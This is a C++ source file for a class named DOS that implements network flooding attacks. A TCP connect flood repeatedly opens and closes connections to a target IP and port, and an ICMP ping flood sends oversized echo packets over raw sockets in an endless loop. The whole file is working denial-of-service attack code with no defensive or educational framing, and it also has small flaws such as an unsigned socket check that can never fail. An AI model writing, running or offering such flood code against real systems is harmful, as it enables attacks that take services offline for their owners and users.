#include <netinet/ip_icmp.h>
#include <netdb.h>
#include <cstring>
#include <iostream>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <vector>
#include <thread>
#include <sys/time.h>
#include <string>
#include <mutex>
#include <sstream>
#include <sys/types.h>
#include <sys/select.h>

#include "h/DOS.h"
#include <iostream>

unsigned short DOS::checksum(void* b, int len)
{
    unsigned short *buf = (unsigned short *)b;
    unsigned int sum = 0;
    unsigned short result;

    for (sum = 0; len > 1; len -= 2)
        sum += *buf++;

    if (len == 1)
        sum += *(unsigned char *)buf;

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}



void DOS::tcp_flood(const char *ip, const int port)
{
    struct sockaddr_in host_addr {};
    host_addr.sin_family = AF_INET;
    host_addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &host_addr.sin_addr);

    while (true)
    {
        if (const int sock = socket(AF_INET, SOCK_STREAM, 0); sock > 0)
        {
            connect(sock, reinterpret_cast<struct sockaddr*>(&host_addr), sizeof(host_addr));
            close(sock);
        }

    }

}

void DOS::ping_flood(const char* ip, const size_t size)
{
    struct sockaddr_in dest_addr{};
    dest_addr.sin_family = AF_INET;
    inet_pton(AF_INET, ip, &dest_addr.sin_addr);

    const size_t buffer_size = (sizeof(struct icmphdr)+size);
    char * packet = new char[buffer_size]{};
    memset(packet, 'X', buffer_size);

    struct icmphdr *icmphdr = reinterpret_cast<struct ::icmphdr*>(packet);
    icmphdr->type = ICMP_ECHO;
    icmphdr->un.echo.id = htons(1234);
    icmphdr->un.echo.sequence = htons(1);
    icmphdr->checksum = 0;
    icmphdr->checksum = DOS::checksum(icmphdr, buffer_size);


    if (const size_t sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP); sock < 0) return;

    while (true)
    {
        const int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
        sendto(sock, packet, buffer_size, 0,
            reinterpret_cast<struct sockaddr*>(&dest_addr),sizeof(dest_addr));

        close(sock);
    }


    delete reinterpret_cast<char*>(packet);
}
